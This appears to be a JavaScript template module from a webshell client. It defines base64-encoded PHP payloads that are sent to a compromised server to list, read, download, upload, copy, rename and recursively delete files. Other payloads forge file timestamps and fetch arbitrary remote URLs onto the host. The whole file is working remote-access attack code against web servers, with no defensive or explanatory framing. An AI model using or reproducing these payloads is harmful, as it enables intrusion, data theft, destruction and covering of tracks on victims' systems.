/**
 * 文件管理模板
 */

module.exports = (arg1, arg2, arg3) => ({
  dir: {
    _:
      `$D=base64_decode($_POST["${arg1}"]);$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D."/".$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="\t".$T."\t".@filesize($P)."\t".$E."\n";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);}`,
    [arg1]: "#{base64::path}"
  },

  delete: {
    _:
      `function df($p){$m=@dir($p);while(@$f=$m->read()){$pf=$p."/".$f;if((is_dir($pf))&&($f!=".")&&($f!="..")){@chmod($pf,0777);df($pf);}if(is_file($pf)){@chmod($pf,0777);@unlink($pf);}}$m->close();@chmod($p,0777);return @rmdir($p);}$F=base64_decode(get_magic_quotes_gpc()?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"]);if(is_dir($F))echo(df($F));else{echo(file_exists($F)?@unlink($F)?"1":"0":"0");}`,
    [arg1]: "#{base64::path}"
  },

  create_file: {
    _:
      `echo @fwrite(fopen(base64_decode($_POST["${arg1}"]),"w"),base64_decode($_POST["${arg2}"]))?"1":"0";`,
    [arg1]: "#{base64::path}",
    [arg2]: "#{base64::content}"
  },

  read_file: {
    _:
      `$F=base64_decode($_POST["${arg1}"]);$P=@fopen($F,"r");echo(@fread($P,filesize($F)?filesize($F):4096));@fclose($P);`,
    [arg1]: "#{base64::path}"
  },

  copy: {
    _:
      `$m=get_magic_quotes_gpc();$fc=base64_decode($m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"]);$fp=base64_decode($m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"]);function xcopy($src,$dest){if(is_file($src)){if(!copy($src,$dest))return false;else return true;}$m=@dir($src);if(!is_dir($dest))if(!@mkdir($dest))return false;while($f=$m->read()){$isrc=$src.chr(47).$f;$idest=$dest.chr(47).$f;if((is_dir($isrc))&&($f!=chr(46))&&($f!=chr(46).chr(46))){if(!xcopy($isrc,$idest))return false;}else if(is_file($isrc)){if(!copy($isrc,$idest))return false;}}return true;}echo(xcopy($fc,$fp)?"1":"0");`,
    [arg1]: "#{base64::path}",
    [arg2]: "#{base64::target}"
  },

  download_file: {
    _:
      `$F=base64_decode(get_magic_quotes_gpc()?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"]);$fp=@fopen($F,"r");if(@fgetc($fp)){@fclose($fp);@readfile($F);}else{echo("ERROR:// Can Not Read");}`,
    [arg1]: "#{base64::path}"
  },

  upload_file: {
    _:
      `$f=base64_decode($_POST["${arg1}"]);$c=$_POST["${arg2}"];$c=str_replace("\r","",$c);$c=str_replace("\n","",$c);$buf="";for($i=0;$i<strlen($c);$i+=2)$buf.=urldecode("%".substr($c,$i,2));echo(@fwrite(fopen($f,"a"),$buf)?"1":"0");`,
    [arg1]: "#{base64::path}",
    [arg2]: "#{buffer::content}"
  },

  rename: {
    _:
      `$m=get_magic_quotes_gpc();$src=base64_decode(m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"]);$dst=base64_decode(m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"]);echo(rename($src,$dst)?"1":"0");`,
    [arg1]: "#{base64::path}",
    [arg2]: "#{base64::name}"
  },

  retime: {
    _:
      `$m=get_magic_quotes_gpc();$FN=base64_decode(m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"]);$TM=strtotime(base64_decode(m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"]));if(file_exists($FN)){echo(@touch($FN,$TM,$TM)?"1":"0");}else{echo("0");};`,
    [arg1]: "#{base64::path}",
    [arg2]: "#{base64::time}"
  },

  mkdir: {
    _:
      `$m=get_magic_quotes_gpc();$f=base64_decode($m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"]);echo(mkdir($f)?"1":"0");`,
    [arg1]: "#{base64::path}"
  },

  wget: {
    _:
      `$fR=base64_decode($_POST["${arg1}"]);$fL=base64_decode($_POST["${arg2}"]);$F=@fopen($fR,chr(114));$L=@fopen($fL,chr(119));if($F && $L){while(!feof($F))@fwrite($L,@fgetc($F));@fclose($F);@fclose($L);echo("1");}else{echo("0");};`,
    [arg1]: "#{base64::url}",
    [arg2]: "#{base64::path}"
  }
})
